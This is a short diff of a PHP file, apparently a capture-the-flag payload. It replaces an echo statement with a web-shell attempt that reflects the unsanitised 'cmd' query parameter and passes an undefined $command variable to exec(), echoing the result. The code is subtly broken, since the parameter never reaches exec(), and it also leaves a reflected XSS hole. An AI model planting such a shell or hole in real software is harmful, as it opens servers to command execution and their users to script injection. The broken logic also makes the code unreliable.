@@ -1,6 +1,17 @@
-<?php
-// This is the payload for the flag. Hope it works!
+<html>
+<body>
 
-echo "Hello"
+Hello! 
+<?php
+
+echo $_GET["cmd"];
+
+$output = exec($command);
+
+
+echo $output;
 
 ?>
+
+</body>
+</html>
